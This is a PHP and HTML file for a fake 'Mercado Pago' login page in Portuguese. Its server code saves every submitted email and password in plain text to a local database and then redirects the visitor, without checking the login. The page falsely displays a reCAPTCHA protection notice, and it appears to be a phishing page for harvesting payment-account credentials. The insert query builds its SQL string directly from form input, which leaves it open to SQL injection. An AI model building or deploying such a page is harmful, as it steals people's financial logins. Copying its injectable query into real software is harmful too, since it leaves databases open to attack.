<?php
$hostname = "localhost";
$bancodedados = "nvisitas";
$usuario = "root";
$senha = "";

$mysqli = new mysqli($hostname, $usuario, $senha, $bancodedados);
if ($mysqli->connect_errno) {
    echo "Falha ao conectar: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
} else {
    echo "Conectado!";
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $senha = $_POST["senha"];

    // Executar consulta SQL para inserir os dados no banco de dados
    $query = "INSERT INTO usuarios (email, senha) VALUES ('$email', '$senha')";
    if ($mysqli->query($query)) {
        echo "LOGADO COM SUCESSO!";
        header("Location: logado.php");
        exit;
    } else {
        echo "Erro ao inserir os dados no banco de dados: " . $mysqli->error;
    }
}

$mysqli->close();
?>

<!DOCTYPE html>
<html lang="pt-br">
<head> 
    <meta charset="utf-8"/>
    <title>MERCADO PAGO</title>
    <link rel="stylesheet" href="CSS/estilo.css">
</head>
<body>
    <div id="corpo-form">
        <form method="POST" action=""> 
            <h1 class="titulo-entrada">Olá! Digite o seu e-mail ou usuário</h1>   
            <div class="row">
                <input type="email" placeholder="E-mail ou usuário" name="email" required>
                <span></span>
            </div>
            <div class="row">
                <input type="text" placeholder="Senha" name="senha" required>
            </div>
            <input type="submit" value="ACESSAR">
        </form>
        <h1 class="titulo-saida">Protegido por reCAPTCHA.<a href="">Privacidade-condições<strong></strong></a></h1>
    </div>
</body>
</html>
